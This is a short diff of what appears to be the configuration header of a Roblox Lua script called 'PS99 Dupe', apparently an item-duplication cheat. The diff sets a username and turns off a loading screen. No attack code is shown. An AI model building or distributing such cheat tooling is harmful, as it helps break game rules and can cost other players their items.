@@ -1,6 +1,6 @@
 
 Username = "Trex_kid9"
-loadingscreen = true
+loadingscreen = false
 --below only if loadingscreen = true
 _G.CustomScriptName = "PS99 Dupe" -- Main text 
 _G.Text1 = "Script Loaded..." --tip test1
